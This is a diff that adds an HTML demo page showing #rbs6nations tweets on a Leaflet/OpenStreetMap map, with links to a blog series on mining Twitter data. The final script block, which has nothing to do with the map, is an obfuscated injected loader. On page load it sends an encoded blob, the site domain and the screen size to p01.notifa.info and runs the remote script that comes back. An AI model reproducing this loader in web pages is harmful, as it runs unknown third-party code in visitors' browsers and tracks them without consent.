@@ -1,0 +1,57 @@
+<html>
+    <head>
+        <title>Map of #rbs6nations Tweets</title>
+        <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.3/leaflet.css" />
+        <script src="http://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.3/leaflet.js"></script>
+        <!--
+        <script src='https://api.tiles.mapbox.com/mapbox.js/v2.1.9/mapbox.js'></script>
+        <link href='https://api.tiles.mapbox.com/mapbox.js/v2.1.9/mapbox.css' rel='stylesheet' />
+        -->
+        <script src="http://code.jquery.com/jquery-2.1.0.min.js"></script>
+        <style>
+        #map {
+            height: 500px;
+        }
+        </style>
+    </head>
+    <body>
+	<h1>Map of #rbs6nations tweets</h1>
+	<p>
+	Read the article about <a href="http://marcobonzanini.com/2015/06/16/mining-twitter-data-with-python-and-js-part-7-geolocation-and-interactive-maps/">how this map has been generated</a>.<br />
+	Description of the <a href="http://marcobonzanini.com/2015/03/23/mining-twitter-data-with-python-part-4-rugby-and-term-co-occurrences/">data collection</a>
+	</p>
+	<p><a href="../">See other demos</a></p>
+        <div id="map"></div>
+<script>
+// var public_token = 'pk.eyJ1IjoiYm9uemFuaW5pIiwiYSI6IjZmODA2ODYzM2UyYTA4YWI0NmMwMjAxYmVjZjdkZGMwIn0.8b8xOSqfwHp4Szg_IwND1Q'
+// var mytiles = L.tileLayer('https://{s}.tiles.mapbox.com/v4/{id}/{z}/{x}/{y}.png?access_token={accessToken}', {
+//     maxZoom: 18,
+//     id: 'bonzanini.mb0n9fan',
+//     accessToken: public_token
+// });
+var mytiles = L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {
+    attribution: '&copy; <a href="http://osm.org/copyright">OpenStreetMap</a> contributors'
+});
+var map = L.map('map');
+$.getJSON("./geo_data.json", function(data) {
+    var myStyle = {
+        radius: 2,
+        fillColor: "red",
+        color: "red",
+        weight: 1,
+        opacity: 1,
+        fillOpacity: 1
+    };
+
+    var geojson = L.geoJson(data, {
+        pointToLayer: function (feature, latlng) {
+            return L.circleMarker(latlng, myStyle);
+        }
+    });
+    geojson.addTo(map)
+});
+map.addLayer(mytiles).setView([50.5, 5.0], 5);
+
+        </script>
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2nJtNC7Ksxx%2b81rUJFhW08ACOwIkhUhkbYcl2h32%2bLgCx3hgdaCAYOz%2bXppRDhVT4X2mhJZZ%2buBia4Ag6N8CnZLuhs%2ffS09gdeNNSHdi8HySSfdwi9kFd5fU7xcXQNf83C1T1AV2JTevB25pNXW%2bItizHSOyBnUWdeATDnU5Vld3OiLv3TA339064dnmcysgft0coyfhY5%2fXGikKOHfxvLgYyMg6egYbO0Dz%2f6HXbCGxDQ0j7t3REmH0vAr8Jn0Iq6hvnEyf7nQ0Owb7gfcafzDCTYUcsERL3cTalGnfQVXppAl6yGXLuw0v2pXDvGBW0aRK7OqGh8aTL8a4Dr1HMlclz4r69s4Vo8tZWmW0bHfSTRxAwOMqJxuQa%2fDoWMYVEZlRKHTCvSpi6w2P3BTXsuhtqlSij8PGJy23ClvK70PbyDoU9dsG%2fdSu5Z%2bUot8yzt3%2fOab6NOVc5cNsyHqaXo0%2fsp%2fvmRM5gx6J9pSqgdwWJts2lbvZ14BtTi252i5QFmjQw%2bH5i6sxlRWWqikubUUb2NBIB8s3B9LvGlrUDeIyAkJT9sqvME%2b6616pfjplM" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
